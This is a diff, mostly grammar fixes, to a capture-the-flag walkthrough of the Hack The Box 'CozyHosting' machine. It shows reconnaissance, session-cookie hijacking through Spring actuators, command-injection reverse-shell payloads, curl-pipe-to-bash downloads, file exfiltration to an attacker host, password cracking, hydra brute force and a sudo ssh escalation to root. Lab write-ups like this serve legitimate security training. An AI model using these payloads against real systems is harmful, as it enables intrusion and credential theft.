@@ -1,6 +1,6 @@
 # HTB: CozyHosting
 
-Lets nmap $TARGET
+Let's nmap $TARGET
 
 ```bash
 $ nmap -oA recon/nmap/quick $TARGET
@@ -18,14 +18,14 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 6.25 seconds
 ```
 
-Quite a few odd ports open. lets start a more in depth scan and take a look at the website on port 80.
+Quite a few odd ports open. Let's start a more in depth scan and take a look at the website on port 80.
 
 ```BASH
 $ sudo nmap -sT -sU -sC -sV -oA recon/nmap/full -p- -v3 --min-rate 10000 $TARGET
 $ firefox http://$TARGET &
 ```
 
-We're redirected to `http://cozyhosting.htb/` but since there's no DNS server to resolve the domain and the server seemingly only responding to requests targeted at `cozyhosting.htb` the page doesn't load. lets add `cozyhosting.htb` to `/etc/hosts`:
+We're redirected to `http://cozyhosting.htb/` but since there's no DNS server to resolve the domain and the server seemingly only responding to requests targeted at `cozyhosting.htb` the page doesn't load. Let's add `cozyhosting.htb` to `/etc/hosts`:
 
 ```bash
 $ sudo bash -c "echo ${TARGET} cozyhosting.htb >> /etc/hosts"
@@ -35,11 +35,11 @@ Refreshing the page again we can access what looks like a hosting website.
 
 ![View of the main website](Assets/hosting_page.jpg)
 
-Since there seems to be quite a few buttons lets run an automated scan using zapproxy to spider to website and maybe pickup on something interesting (active crawling is not available in free version of burp suite)
+Since there seems to be quite a few buttons; let's run an automated scan using zapproxy to spider to website and maybe pickup on something (doesn't end up finding anything interesting).
 
 ![View of the quick start page of zap proxy](Assets/zap_spider.jpg)
 
-While at it lets run a vhost fuzzer since the website uses a domain name and run a generic feroxbuster dir bust:
+While at it let's run a vhost fuzzer (nothing found) and a generic feroxbuster fuzz:
 
 ```bash
 $ gobuster vhost -u http://cozyhosting.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o recon/vhostbust
@@ -55,11 +55,11 @@ Ignoring template assets
 200      GET      285l      745w    12706c http://cozyhosting.htb/
 ```
 
-We see that there's an admin page that we don't have access to so the login page becomes really interesting:
+We see that there's an admin page that we don't have access to, so the login page becomes really interesting:
 
 ![login page of the website](Assets/login_page.jpg)
 
-Since we don't really know the tech stack used to build the app yet lets run a special character fuzz with burp suite + sqlmap and try to figure out how the website is built.
+Since we don't really know the tech stack used to build the app yet; let's run a special character fuzz with burp suite + sqlmap in the background and try to figure out how the website is built.
 
 ```bash
 $ sqlmap --forms --level 5 -risk 3 -u http://cozyhosting.htb/login
@@ -68,7 +68,7 @@ $ sqlmap --forms --level 5 -risk 3 -u http://cozyhosting.htb/login
 
 ![Burp suite intruder windows showing the fuzzed fields](Assets/burp_special_char_fuzz.jpg)
 
-While intercepting the login request for burp suite fuzz we can see in the response that the server sets a `JSESSIONID` cookie. Is the back end based on java? Lets keep digging.
+Intercepting the login request with burp suite we can see in the response that the server sets a `JSESSIONID` cookie. Is the back-end based on java?
 
 ![Response to the login request show in burp suite](Assets/jess_cokie_from_login_resp.jpg)
 
@@ -76,7 +76,7 @@ Going to a non existing page we get an error, googling it mentions spring boot f
 
 ![Whitelabel Error Page of spring boot](Assets/error_page_web.jpg)
 
-Since there seems to be a spring specific word list in SecLists lets run that with feroxbuster:
+There seems to be a spring specific word list in SecLists. Let's run that with feroxbuster:
 
 ```bash
 $ echo "Ignoring template assets"; cat feroxMedWords | grep -v assets
@@ -99,7 +99,7 @@ Ignoring template assets
 200      GET      285l      745w    12706c http://cozyhosting.htb/
 ```
 
-Googling "spring boot exploit" seems to also mention actuators. Since the fuzz didn't show any endpoints with known RCE vectors next interesting targets are the sessions, env and mappings actuators.
+Googling "spring boot exploit" seems to mention actuators. Since the fuzz didn't show any endpoints with known RCE vectors next interesting targets are the sessions, env and mappings actuators.
 
 ```bash
 $ wget http://cozyhosting.htb/actuator/mappings && cat mappings | jq
@@ -162,7 +162,7 @@ $ wget http://cozyhosting.htb/actuator/sessions && cat sessions | jq
 }
 ```
 
-Seems like someone else is logged in currently. lets use their session cookie and see if we can access /admin.
+Seems like someone else is logged in currently. Let's use their session cookie and see if we can access /admin.
 
 ![Editing the cookie using the firefox dev tools](Assets/firefox_changing_cookie.jpg)
 
@@ -198,7 +198,7 @@ host=localhost&username=root
 
 Redirects to: `http://cozyhosting.htb/admin?error=Host%20key%20verification%20failed.` (This looks like an xxs vector but seems to be escaped properly)
 
-lets fuzz the form with special characters using burp suite again.
+Let's fuzz the form with special characters using burp suite again.
 
 ![Showing intruder page in burp suite setting up fuzz](Assets/ssh_form_fuzz_burp.jpg)
 
@@ -206,9 +206,9 @@ It seems the error parameter has the output of the ssh command.
 
 ![http response showing ssh output passed in as the err param](Assets/burp_ssh_output_in_err.jpg)
 
-Possibly vulnerable to command injection? lets try some payloads.
+Possibly vulnerable to command injection? Let's try some payloads.
 
-`host=localhost&username=$(curl 10.10.14.30:8000)` results in: `Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!`. [Hacktricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) seems to have quite a bit of good content on this. lets try the short rev shell trick.
+`host=localhost&username=$(curl 10.10.14.30:8000)` results in: `Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!`. [Hacktricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) seems to have quite a bit of good content on this. Let's try the short rev shell trick.
 
 Start the listener:
 
@@ -216,7 +216,7 @@ Start the listener:
 $ nc -lvnp 9001
 ```
 
-`host=localhost&username=(sh)0>/dev/tcp/10.10.13.30/9001` Seems to cause an error: `Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: syntax error near unexpected token (\'/bin/bash: -c: line 1: ssh -o ConnectTimeout=1 (sh)0>/dev/tcp/10.10.13.30/9001@localhost'`. Since the parameter seems to go directly into the username it throws an error. lets make bash use the return of the shell payload as the username with `$()`, `host=localhost&username=$((sh)0>/dev/tcp/10.10.13.30/9001)`
+`host=localhost&username=(sh)0>/dev/tcp/10.10.13.30/9001` Seems to cause an error: `Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: syntax error near unexpected token (\'/bin/bash: -c: line 1: ssh -o ConnectTimeout=1 (sh)0>/dev/tcp/10.10.13.30/9001@localhost'`. Since the parameter seems to go directly into the username it throws an error. Let's make bash use the return of the shell payload as the username with `$()`, `host=localhost&username=$((sh)0>/dev/tcp/10.10.13.30/9001)`
 
 Sending:
 
@@ -240,7 +240,7 @@ host=localhost&username=$((sh)0>/dev/tcp/10.10.13.30/9001)
 
 ```
 
-Gives us a shell! lets run `exec >&0` as stated in the instruction on hacktricks.
+Gives us a shell! Let's run `exec >&0` as stated in the instruction on hacktricks.
 
 ```bash
 $ nc -lvnp 9001
@@ -254,15 +254,15 @@ pwd
 
 ```
 
-Since this shell is likely very fragile lets upgrade it:
+Since this shell is likely very fragile; let's upgrade it:
 
-Start the listener ([found on this blog post](https://medium.com/@Thigh_GoD/how-to-automatically-upgrade-a-dumb-reverse-shell-6a4cb5c44997))
+Start the listener ([found on this blog post](https://medium.com/@Thigh_GoD/how-to-automatically-upgrade-a-dumb-reverse-shell-6a4cb5c44997)).
 
 ```bash
 stty raw -echo; stty size && rcat l -ie "script -qc /bin/bash /dev/null" 9002 && reset
 ```
 
-running the payload directly in the existing shell seems to break it. We'll need to cradle it:
+Running the payload directly in the existing shell seems to break it. We'll need to cradle it:
 
 ```bash
 $ cat "/bin/bash -i >& /dev/tcp/10.10.14.30/9002 0>&1" > sh
@@ -277,7 +277,7 @@ $ curl 10.10.14.30:8000/sh | /bin/bash
 
 And we get a nice upgraded shell!
 
-Right off the bat we can see a jar file and guessing from the filename, username, and directory we can assume it's the source of the web app we've been dealing with. Never the less lets run linpeas:
+Right off the bat we can see a jar file and guessing from the filename, username, and directory we can assume it's the source of the web app we've been dealing with. Never the less; let's run linpeas:
 
 ```bash
 $ py -m uploadserver
@@ -285,19 +285,19 @@ File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-start a listener to capture linpeas output:
+Start a listener to capture linpeas output:
 
 ```bash
 $ nc -lp 9002 | tee recon/linpeaoutput
 ```
 
-and fire off linpeas
+and fire off linpeas.
 
 ```bash
 $ curl 10.10.14.30:8000/p | bash &> /dev/tcp/10.10.14.30/9001 &
 ```
 
-lets also upload the jar file so we can have a closer look:
+Let's also upload the jar file so we can have a closer look:
 
 ```bash
 $ which python3
@@ -305,16 +305,7 @@ $ which python3
 $ python3 -c 'import requests;requests.post("http://10.10.14.30:8000/upload",files={"files":open("cloudhosting-0.0.1.jar","rb")})'
 ```
 
-Running [Floss](https://github.com/mandiant/flare-flosshttps://github.com/mandiant/flare-floss) doesn't seem to work so lets get right to decompilation:
-
-```bash
-$ floss cloudhosting-0.0.1.jar
-INFO: floss: extracting static strings...
-ERROR: floss: cannot deobfuscate strings from files larger than 0x1000000 bytes
-$ floss --only static -- cloudhosting-0.0.1.jar > recon/flossStrings
-```
-
-Currently the commonly suggested decompiler seems to be [vineflower](https://vineflower.org/) so lets use that.
+Currently the commonly suggested decompiler seems to be [vineflower](https://vineflower.org/) so let's use that.
 
 ```bash
 $ java -jar vineflower.jar cloudhosting-0.0.1.jar cloudhosting
@@ -347,7 +338,7 @@ import jakarta.persistence.Table;
  ... snip ...
 ```
 
-Some creds and the table schema here! lets dump the DB.
+Some creds and the table schema here! Let's dump the DB.
 
 ```bash
 app@cozyhosting:/app$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost:5432/cozyhosting" -c 'SELECT * FROM users'
@@ -358,7 +349,7 @@ app@cozyhosting:/app$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost:5432/co
 (2 rows)
 ```
 
-lets start cracking the hashes and have a look through the linpeas output:
+Let's start cracking the hashes and have a look through the linpeas output:
 
 ```bash
 $ hashcat --user hashes -m 3200 rockyou.txt
@@ -371,7 +362,7 @@ $ hashcat --user hashes -m 3200 rockyou.txt --show
 admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 ```
 
-lets run hydra on the on ssh and see if we can get logged in:
+Let's run hydra on the on ssh and see if we can get logged in:
 
 ```BASH
 $ cat loot/leaked_passwd | grep sh$ | awk -F ':' '{print $1}' | tee loot/leakedUsers
@@ -394,7 +385,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-We got a login! Lets again run linpeas in the background while we look around manually (linpeas doesn't find anything interesting, steps are the same as previously):
+We got a login! Seems hydra was overkill here. Let's again run linpeas in the background while we look around manually (linpeas doesn't find anything interesting, steps are the same as previously):
 
 ```bash
 josh@cozyhosting:~$ sudo -l
@@ -406,7 +397,7 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
 
-user josh can run ssh as root, GTFO bins says the breakout into a shell is as easy as running:
+Checking sudo we see that user josh can run ssh as root, [GTFO bins](https://gtfobins.github.io/) says the breakout into a shell is as easy as running:
 
 ```bash
 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
